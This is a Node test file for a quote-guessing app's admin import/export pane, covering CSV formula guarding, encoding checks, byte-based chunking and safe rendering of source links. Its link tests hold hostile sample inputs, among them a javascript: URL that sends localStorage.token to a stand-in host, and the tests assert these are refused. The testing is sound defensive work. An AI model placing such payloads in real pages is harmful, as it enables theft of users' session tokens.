/************************************************
 * Quote Guess import / export (js/quote-guess-logic.js and the admin
 * Import / export pane, js/views/admin/cms-quotes-io.js):
 *   - a CSV export starts with a UTF-8 BOM and re-imports as it was (the
 *     formula guard's apostrophe comes off again; the key still matches);
 *   - import rows garbled by a wrong encoding (U+FFFD) are refused;
 *   - `source` is only an http(s) link, and only such a link is rendered;
 *   - commit chunks are measured in UTF-8 bytes, not UTF-16 units;
 *   - staged files / pasted text count as unsaved, the import id shows as
 *     soon as the first chunk is in, and Import works again after a
 *     failed chunk.
 *
 * Run: npm test  (node --test)
 ************************************************/
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const Q = require('../js/quote-guess-logic.js');

const read = (f) => fs.readFileSync(path.join(__dirname, '..', 'js', f), 'utf8');
const MOVIE = { id: 'avengers1', title: 'The Avengers', runtime: 143 };

// ── round trip ──

test('CSV export starts with a BOM and round-trips: the formula guard comes off, the key still matches', () => {
  const rows = [
    { speaker: 'Loki', text: '-- Is that a threat?' },
    { speaker: '@Stark', text: '=SUM(1)', reply: { speaker: 'Loki', text: '+1, I’m sure' }, note: '@ the tower' },
    { speaker: 'Thor', text: "'Tis a fine day" }
  ];
  const lines = rows.map(r => {
    const v = Q.validateLine(r, { project: MOVIE, mode: 'admin' });
    assert.ok(v.ok, JSON.stringify(v.errors));
    return Object.assign({}, v.line, { projectId: 'avengers1' });
  });
  const csv = Q.toCsv(lines);
  assert.equal(csv.charCodeAt(0), 0xFEFF, 'a BOM first, so Excel reads UTF-8');
  assert.match(csv, /'-- Is that a threat\?/, 'the export still defuses formulas');
  assert.match(csv, /'=SUM\(1\)/);

  const back = Q.rowsFromCsv(csv);
  assert.equal(back.error, null);
  assert.equal(back.rows[0].projectId, 'avengers1', 'the BOM does not stick to the first header');
  assert.equal(back.rows[0].text, '-- Is that a threat?');
  assert.equal(back.rows[1].text, '=SUM(1)');
  assert.equal(back.rows[1].speaker, '@Stark');
  assert.equal(back.rows[1].replyText, '+1, I’m sure');
  assert.equal(back.rows[1].note, '@ the tower');
  assert.equal(back.rows[2].text, "'Tis a fine day", 'an apostrophe before anything else stays');

  // Re-importing finds every line already in the bank (no corrupted duplicates).
  const existing = new Set(lines.map(l => 'avengers1|' + l.textKey));
  const plan = Q.planImport(back.rows, { projects: [MOVIE], existingKeys: existing });
  assert.deepEqual(plan.rows.map(r => r.status), ['dupe-db', 'dupe-db', 'dupe-db']);
  assert.equal(plan.rows[0].line.text, '-- Is that a threat?', 'Update mode writes the original text back');
});

test('import refuses text garbled by a wrong encoding (U+FFFD); admin and suggest modes are unchanged', () => {
  const bad = { speaker: 'Tony', text: 'I�m Iron Man.' };
  const v = Q.validateLine(bad, { project: MOVIE, mode: 'import' });
  assert.equal(v.ok, false);
  assert.match(v.errors.text, /UTF-8/);
  assert.match(Q.validateLine({ speaker: 'T�ny', text: 'Hi.', reply: { speaker: 'Pepper', text: 'Hey�' }, note: 'x�' }, { project: MOVIE, mode: 'import' }).errors.speaker, /UTF-8/);
  const all = Q.validateLine({ speaker: 'T�ny', text: 'Hi.', reply: { speaker: 'Pepper', text: 'Hey�' }, note: 'x�' }, { project: MOVIE, mode: 'import' }).errors;
  assert.deepEqual(Object.keys(all).sort(), ['note', 'replyText', 'speaker']);
  assert.equal(Q.validateLine({ speaker: 'Tony', text: 'I’m Iron Man.' }, { project: MOVIE, mode: 'import' }).ok, true);
  const plan = Q.planImport([Object.assign({ projectId: 'avengers1' }, bad)], { projects: [MOVIE] });
  assert.equal(plan.rows[0].status, 'error');
  assert.ok(plan.rows[0].errors.text);
});

test('source is accepted only empty or as an http(s) link', () => {
  const v = (source, mode) => Q.validateLine({ speaker: 'Loki', text: 'I have an army.', source }, { project: MOVIE, mode: mode || 'admin' });
  assert.equal(v('').ok, true);
  assert.equal(v('https://www.imdb.com/title/tt0848228/quotes').ok, true);
  assert.equal(v('HTTP://example.com/x').ok, true);
  for (const bad of ["javascript:fetch('//x/?'+localStorage.token)", 'JavaScript:alert(1)', 'data:text/html,hi', 'imdb.com/title', '//evil.example/x', ' javascript:alert(1)']) {
    assert.ok(v(bad).errors.source, bad);
    assert.ok(v(bad, 'import').errors.source, 'import: ' + bad);
  }
  assert.equal(Q.isWebLink('https://a.b'), true);
  assert.equal(Q.isWebLink('javascript:alert(1)'), false);
  assert.equal(Q.isWebLink(null), false);
});

// ── chunk size in bytes ──

function assertChunks(QL, rows) {
  const chunks = QL.chunkRows(rows);
  assert.equal(chunks.flat().length, rows.length);
  for (const c of chunks) {
    assert.ok(c.length <= QL.C.COMMIT_ROWS);
    assert.ok(Buffer.byteLength(JSON.stringify(c), 'utf8') <= QL.C.COMMIT_BYTES, `chunk of ${Buffer.byteLength(JSON.stringify(c), 'utf8')} bytes`);
  }
  return chunks;
}

test('chunkRows measures UTF-8 bytes: multi-byte rows that fit by UTF-16 length are split under the byte limit', () => {
  // ~163 UTF-16 units but ~463 UTF-8 bytes a row: 300 rows are ~49k units
  // (one chunk by .length) but ~139k bytes (over the 64 KB body limit).
  const rows = Array.from({ length: 300 }, (_, i) => ({ text: '’'.repeat(150), i }));
  assert.ok(JSON.stringify(rows).length < Q.C.COMMIT_BYTES, 'the old measure would have sent one chunk');
  const chunks = assertChunks(Q, rows);
  assert.ok(chunks.length >= 3, `${chunks.length} chunks`);
  // Emoji (4 bytes, 2 UTF-16 units) and plain ASCII mixed in.
  assertChunks(Q, Array.from({ length: 800 }, (_, i) => ({ text: (i % 2 ? '🦸' : 'Ok ').repeat(60), i })));
});

test('chunkRows in the browser (TextEncoder, no Buffer) measures the same bytes', () => {
  const ctx = { TextEncoder, console };
  ctx.window = ctx; ctx.self = ctx;
  vm.createContext(ctx);
  vm.runInContext(read('scene-guess-logic.js'), ctx);
  vm.runInContext(read('quote-guess-logic.js'), ctx);
  const QB = ctx.QuoteGuessLogic;
  assert.equal(typeof ctx.Buffer, 'undefined');
  const rows = Array.from({ length: 300 }, (_, i) => ({ text: 'é—’'.repeat(50), i }));
  const a = assertChunks(QB, rows);
  assert.equal(JSON.stringify(a.map(c => c.length)), JSON.stringify(Q.chunkRows(rows).map(c => c.length)));
});

// ── the Import / export pane ──

function el(tag) {
  const listeners = {};
  const qs = new Map();
  const cls = new Set();
  const e = {
    tagName: tag, value: '', textContent: '', hidden: false, disabled: false, dataset: {}, style: {},
    _html: '', _onHtml: null,
    get innerHTML() { return e._html; },
    set innerHTML(v) { e._html = String(v); if (e._onHtml) e._onHtml(e._html); },
    classList: { add: (c) => cls.add(c), remove: (c) => cls.delete(c), contains: (c) => cls.has(c), toggle: (c, on) => { if (on === undefined ? !cls.has(c) : on) cls.add(c); else cls.delete(c); } },
    addEventListener(t, f) { (listeners[t] = listeners[t] || []).push(f); },
    fire(t) { return (listeners[t] || []).map(f => f({ preventDefault() {}, target: e })); },
    querySelector(s) { if (!qs.has(s)) qs.set(s, el('q')); return qs.get(s); },
    querySelectorAll() { return []; },
    appendChild(c) { return c; }, remove() {}, click() {}, setAttribute() {}, focus() {},
    get firstElementChild() { return e.querySelector(':first'); }
  };
  return e;
}

function setup() {
  const toasts = [];
  const ctx = {
    console, setTimeout, clearTimeout, URLSearchParams, TextEncoder,
    document: { createElement: el, getElementById: () => null, body: el('body') },
    location: { pathname: '/admin', search: '' },
    history: { state: null, replaceState() {} },
    Router: { go() {}, replaceUrl() { return true; } },
    confirmDialog: async () => true
  };
  ctx.window = ctx; ctx.self = ctx;
  vm.createContext(ctx);
  for (const f of ['scene-guess-logic.js', 'quote-guess-logic.js', 'views/admin/index.js', 'views/admin/cms-quotes.js', 'views/admin/cms-quotes-io.js']) vm.runInContext(read(f), ctx);
  vm.runInContext('this.AdminView = AdminView;', ctx);
  const AdminView = ctx.AdminView;
  AdminView.toast = (m, kind) => toasts.push({ m, kind });
  return { ctx, AdminView, Editor: AdminView._cms.quotes, IO: AdminView._quotes.io, toasts };
}
const tick = () => new Promise(r => setImmediate(r));

test('Import / export: staged files and pasted text count as unsaved (with a note); Discard, unmount and a finished import clear it', async () => {
  const { AdminView, Editor, IO } = setup();
  const host = el('div');
  IO.mount(host, {});
  AdminView._activeTab = Editor;
  assert.equal(Editor.isDirty(), false);
  assert.equal(Editor.dirtyNote(), null);

  IO.addText('lines.csv', 'projectId,speaker,text\navengers1,Loki,I have an army.\n');
  await tick();
  assert.equal(IO._sources.length, 1);
  assert.equal(Editor.isDirty(), true, 'a staged file is unsaved work');
  assert.match(Editor.dirtyNote(), /staged/);
  assert.equal(AdminView.isDirty(), true, 'so the leave guard and beforeunload ask');
  assert.match(AdminView._tabDirtyNote(), /staged/);
  assert.equal(Editor.canSave(), false, 'the Save bar offers Discard only');

  Editor.discard();
  assert.equal(IO._sources.length, 0);
  assert.equal(Editor.isDirty(), false);

  host.querySelector('.qte-paste-text').value = '  speaker,text\nLoki,Hi  ';
  assert.equal(Editor.isDirty(), true, 'text in the paste box counts too');
  assert.match(Editor.dirtyNote(), /Pasted/);
  host.querySelector('.qte-paste-text').value = '   ';
  assert.equal(Editor.isDirty(), false, 'whitespace alone does not');

  IO.addText('lines.csv', 'projectId,speaker,text\navengers1,Loki,I have an army.\n');
  await tick();
  assert.equal(Editor.isDirty(), true);
  IO.unmount();
  assert.equal(Editor.isDirty(), false, 'unmounted (the admin chose to leave): nothing pending');

  // A finished import: the staged files went in, nothing left to lose.
  IO.mount(host, {});
  IO.addText('lines.csv', 'projectId,speaker,text\navengers1,Loki,I have an army.\n');
  await tick();
  IO._rows = [{ projectId: 'avengers1', speaker: 'Loki', text: 'I have an army.' }];
  IO._plan = { rows: [{ index: 0, status: 'ok' }], counts: { ok: 1, dupe: 0, error: 0 }, byProject: {} };
  AdminView.api = async () => ({ inserted: 1, updated: 0, skipped: 0, failed: [] });
  await IO.commit();
  assert.equal(IO.isBusy(), false);
  assert.equal(Editor.isDirty(), false, 'imported: the staged files no longer count');
  IO.addText('more.csv', 'projectId,speaker,text\navengers1,Thor,Another.\n');
  await tick();
  assert.equal(Editor.isDirty(), true, 'a new file staged after it does');
});

function stagedCommit(IO, host, n) {
  IO.mount(host, {});
  IO._rows = Array.from({ length: n }, (_, i) => ({ projectId: 'avengers1', speaker: 'Loki', text: 'Line ' + i }));
  IO._plan = { rows: IO._rows.map((_, i) => ({ index: i, status: 'ok' })), counts: { ok: n, dupe: 0, error: 0 }, byProject: {} };
  host.querySelector('input[name="qte-mode"]:checked').value = 'skip';
}

test('Import / export: the import id shows once the first chunk is in; a failed chunk re-enables Import', async () => {
  const { ctx, AdminView, IO, toasts } = setup();
  ctx.QuoteGuessLogic.chunkRows = (rows) => rows.map(r => [r]);   // one row a chunk
  const host = el('div');
  stagedCommit(IO, host, 3);
  const calls = [];
  AdminView.api = (p, o) => new Promise((resolve, reject) => calls.push({ p, body: JSON.parse(o.body), resolve, reject }));
  const btn = host.querySelector('.qte-commit');
  const result = host.querySelector('.qte-io-result');

  const run = IO.commit();
  await tick();
  assert.equal(calls.length, 1);
  assert.equal(btn.disabled, true);
  const importId = calls[0].body.importId;
  assert.match(importId, /^imp-/);
  assert.doesNotMatch(result.innerHTML, /imp-/, 'nothing is in yet');

  calls[0].resolve({ inserted: 1, updated: 0, skipped: 0, failed: [] });
  await tick();
  assert.equal(calls.length, 2, 'second chunk on its way');
  assert.ok(result.innerHTML.includes(importId), 'the id shows after the first chunk, mid-import');
  assert.doesNotMatch(result.innerHTML, /qte-undo/, 'no Undo while chunks are still going');
  assert.ok(toasts.some(t => t.m.includes(importId)), 'and a toast carries it (it outlives the pane)');

  const err = Object.assign(new Error('HTTP 500'), { status: 500 });
  calls[1].reject(err);
  await run;
  assert.equal(calls.length, 2, 'stops at the failed chunk');
  assert.equal(btn.disabled, false, 'Import can be pressed again');
  assert.equal(IO.isBusy(), false);
  assert.match(result.innerHTML, /Stopped/);
  assert.ok(result.innerHTML.includes(importId), 'the id stays on screen with Undo');
  assert.match(result.innerHTML, /qte-undo/);
});

test('Import / export: leaving mid-import stops it and toasts the import id of what already went in', async () => {
  const { ctx, AdminView, IO, toasts } = setup();
  ctx.QuoteGuessLogic.chunkRows = (rows) => rows.map(r => [r]);
  const host = el('div');
  stagedCommit(IO, host, 3);
  const calls = [];
  AdminView.api = (p, o) => new Promise((resolve) => calls.push({ body: JSON.parse(o.body), resolve }));
  const run = IO.commit();
  await tick();
  calls[0].resolve({ inserted: 1, updated: 0, skipped: 0, failed: [] });
  await tick();
  assert.equal(IO.isDirty(), true, 'running');
  assert.match(IO.dirtyNote(), /still running/);
  IO.unmount();                       // the leave guard said "Leave"
  calls[1].resolve({ inserted: 1, updated: 0, skipped: 0, failed: [] });
  await run;
  assert.equal(calls.length, 2, 'no third chunk after leaving');
  const id = calls[0].body.importId;
  assert.ok(toasts.some(t => /stopped/i.test(t.m) && t.m.includes(id) && /2 added/.test(t.m)), JSON.stringify(toasts));
  assert.equal(IO.isBusy(), false);
});

test('island page: "source ↗" is rendered only for an http(s) link', () => {
  const { Editor } = setup();
  const lines = el('div');
  const host = el('div');
  host.querySelector = (s) => (s === '.qte-lines' ? lines : el('q'));
  Editor._container = { querySelector: (s) => (s === '.qte-host' ? host : el('q')), querySelectorAll: () => [] };
  const line = (id, source) => ({ id, projectId: 'avengers1', speaker: { name: 'Loki', key: 'loki' }, text: 'Line ' + id, reply: null, status: 'approved', active: true, origin: 'admin', decoys: {}, source });
  Editor._detail = { project: { id: 'avengers1', title: 'The Avengers', episodes: [] }, lines: [
    line('a', 'https://www.imdb.com/title/tt0848228/quotes'),
    line('b', "javascript:fetch('//x/?'+localStorage.token)"),
    line('c', 'data:text/html,hi'),
    line('d', '')
  ] };
  Editor._filter = { q: '', status: 'live' };
  Editor._forms.clear();
  Editor.renderLines();
  const html = lines.innerHTML;
  const cardOf = (id) => html.split('<article').find(c => c.includes(`data-id="${id}"`));
  assert.match(cardOf('a'), /class="qte-src" href="https:\/\/www\.imdb\.com/);
  for (const id of ['b', 'c', 'd']) assert.doesNotMatch(cardOf(id), /qte-src/, id);
  assert.doesNotMatch(html, /javascript:/);
});
